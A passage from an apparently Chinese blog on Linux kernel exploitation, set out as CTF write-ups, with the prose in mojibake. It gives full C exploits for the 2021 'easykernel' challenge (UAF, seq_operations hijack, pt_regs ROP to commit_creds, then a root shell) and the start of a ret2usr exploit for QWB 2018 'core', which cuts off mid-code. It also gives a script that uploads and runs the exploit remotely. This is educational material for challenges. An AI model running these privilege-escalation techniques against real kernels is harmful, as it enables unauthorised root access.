= <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./b64_exp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br><br>p.sendline()<br>p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;echo &#x27;&#x27; &gt; /tmp/b64_exp;&quot;</span>)<br><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;now line: &#x27;</span> + <span class="hljs-built_in">str</span>(count))<br>    line = f.readline().replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)&lt;=<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    cmd = <span class="hljs-string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="hljs-string">b&quot;&#x27; &gt;&gt; /tmp/b64_exp;&quot;</span><br>    p.sendline(cmd) <span class="hljs-comment"># send lines</span><br>    <span class="hljs-comment">#time.sleep(0.02)</span><br>    <span class="hljs-comment">#p.recv()</span><br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br>    count += <span class="hljs-number">1</span><br>f.close()<br><br>p.sendline(<span class="hljs-string">&quot;base64 -d /tmp/b64_exp &gt; /tmp/exp.tar.gz;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;tar -xzvf /tmp/exp.tar.gz&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/tmp/exploit&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="2021è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›easykernel">2021è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›easykernel</h3><h4 id="0x1åˆ†æ">0x1åˆ†æ</h4><p>ç‰ˆæœ¬5.8.0,ä¿æŠ¤smep,kalsr,PTI</p><p>æ¼æ´é©±åŠ¨ï¼Œä¸€ä¸ªå †èœå•ï¼ŒåŠŸèƒ½é½å…¨</p><p>kfreeå‚æ•°ä¸ºç©ºå¾ˆå¥‡æ€ª</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684500595851.png" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// /mm/slab.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *objp)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>trace_kfree(_RET_IP_, objp);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(objp)))<br><span class="hljs-keyword">return</span>;<br><span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æºç ä¸­æ£€æŸ¥å¦‚æœå‚æ•°ä¸ºNULL,ç›´æ¥returnç»“æŸï¼Œä»€ä¹ˆéƒ½ä¸åš</p><p>è¿™é‡Œåº”è¯¥æ˜¯idaåæ±‡ç¼–æ˜¾ç¤ºæœ‰ç‚¹é—®é¢˜</p><p>æ±‡ç¼–è¯­å¥è¿™é‡Œæ˜¯èµ‹å€¼rdiä¸ºaddrlistäº†ï¼Œæ‰€ä»¥æ˜¯æœ‰å‚æ•°çš„ï¼Œæ˜¯ä¸ªuaf</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684500595851.png" alt="2"></p><p>æ­¤å¤–æˆ‘è‡ªå·±å®é™…æµ‹è¯•ä¸‹æ¥æ˜¯å¼€å¯äº†Slub Freelist Hardenedï¼Œfdè¢«å¼‚æˆ–åŠ å¯†äº†</p><p>æ²¡æ³•ç›´æ¥doublefreeè¾¾æˆä»»æ„å†™</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684500595851.png" alt="3"></p><h4 id="0x2-seq-pt-regs-ROP">0x2:seq+pt_regs+ROP</h4><p>1.åˆ¶é€ 0x20å¤§å°uafï¼Œåˆ†é…åˆ°seqç»“æ„ä½“ï¼Œæ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€</p><p>2.åŠ«æŒseq_operations-&gt;startï¼Œæ ˆè¿ç§»è‡³å†…æ ¸æ ˆpt_regsï¼Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„ropé“¾ææƒ</p><h4 id="0x3Exp">0x3Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-comment">//cat g2|grep &quot;: pop rdi ; ret$&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-type">int</span> fd,tty_fd=<span class="hljs-number">-1</span>,seq_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode,init_cred,pop_rdi_ret,commit_creds,gadget;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span>&#123;</span><br>    <span class="hljs-type">size_t</span> idx; <br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span>&#123;</span><br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">void</span>  *buf;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016lx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">void</span> *buf)</span>&#123; <br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x40</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">void</span> *buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x50</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    ioctl(fd,<span class="hljs-number">0x30</span>,&amp;idx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">ac</span>=</span>&#123;<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x20</span>,&amp;ac);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_kernel_base</span><span class="hljs-params">()</span>&#123;<br>    buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-comment">//printf(&quot;%lx\n&quot;,buf);</span><br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x300</span>);<br>    add(<span class="hljs-number">0x20</span>,buf);<span class="hljs-comment">//0</span><br>    del(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(seq_fd==<span class="hljs-number">-1</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;seq&quot;</span>);<br>    &#125;<br>    show(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    Hexdump(buf,<span class="hljs-number">0x20</span>);<br>    kernel_offset=*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(buf)<span class="hljs-number">-0x319D30</span><span class="hljs-number">-0xffffffff81000000</span>;<br>    commit_creds=kernel_offset+COMMIT_CREDS;<br>    init_cred=kernel_offset+INIT_CRED;<br>    swapgs_restore_regs_and_return_to_usermode=kernel_offset+SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    pop_rdi_ret=kernel_offset+POP_RDI_RET;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0F6                 add     rsp, 180h</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0FD                 pop     rbx</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B0FE                 pop     r12</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B100                 pop     r13</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B102                 pop     r14</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B104                 pop     rbp</span><br><span class="hljs-comment">    .text:FFFFFFFF8135B105                 retn</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] init_cred: %p\n&quot;</span>, init_cred);<br><br>    <span class="hljs-type">size_t</span> gdget[<span class="hljs-number">4</span>];<br>    gdget[<span class="hljs-number">0</span>]=gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, gdget);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_pt_regs_rop</span><span class="hljs-params">()</span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span>       <span class="hljs-comment">//read(seq_fd,&quot;rsp&quot;,8)</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    fd=open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;open ko&quot;</span>);<br>    &#125;<br>    save_status();<br>    leak_kernel_base();<br>    seq_pt_regs_rop();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684500595851.png" alt="4"></p><h4 id="0x4å…¶ä»–">0x4å…¶ä»–</h4><p>å…³äºå¦‚ä½•è°ƒè¯•ï¼Œå¯»æ‰¾rspä¸pt_regsçš„åç§»</p><p>å°±æ˜¯æˆ‘ä»¬èƒ½åŠ«æŒripäº†å˜›ï¼Œé‚£å°±ç›´æ¥gdb æ–­ç‚¹åœ¨<code>add rsp,val ;ret</code> è¿™ç§gadgetçš„åœ°å€</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684500595851.png" alt="5"></p><p>è¿™é‡Œåç§»ä¸º<code>0x1a0</code></p><p>è¿™ä¸ªgadgetæ˜¯<code>add rsp,0x180;pop rbx;pop r12;pop r13;pop r14;pop rbp;ret</code></p><p>åˆšå¥½åˆ°<code>pop rdi</code> æ‰§è¡Œæˆ‘ä»¬å¸ƒç½®çš„ropé“¾</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684500595852.png" alt="6"></p><p>è¿˜æœ‰å°±æ˜¯swapgs_restore_regs_and_return_to_usermodeä¸ºå•¥è¦+9</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684500595852.png" alt="8"></p><p>æˆ‘ä»¬æ§åˆ¶åˆ°rbpï¼Œè¿™é‡Œä¹Ÿæ˜¯è¦å¯¹åº”èµ·æ¥çš„</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684500595852.png" alt="7"></p><h2 id="02-ret2usr">02.ret2usr</h2><h3 id="å¼ºç½‘æ¯2018-core">å¼ºç½‘æ¯2018-core</h3><h4 id="NO-SMEP-SMAPï¼š">NO SMEP/SMAPï¼š</h4><p>è¿˜æ˜¯ä»¥è¿™é¢˜ä¸ºä¾‹ï¼Œè¿™é¢˜qemuå¯åŠ¨æ—¶æ²¡å¼€å¯smepï¼Œé™¤äº†kernel ropå¦ä¸€ç§è§£æ³•å°±æ˜¯ret2usr</p><h5 id="0x01å·®åˆ«">0x01å·®åˆ«</h5><p>å¯ä»¥çœ‹åˆ°ï¼Œä»åŸæœ¬çš„ropå‡º<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code>å˜ä¸ºäº†ç›´æ¥åœ¨å†…æ ¸æ€è°ƒç”¨ç”¨æˆ·æ€çš„<code>commit_creds_addr(prepare_kernel_cred_addr(0))</code></p><p>å› ä¸ºå†…æ ¸æ€å¯ä»¥ä»¥ <code>ring 0</code> ç‰¹æƒæ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç </p><h5 id="0x02exp">0x02exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        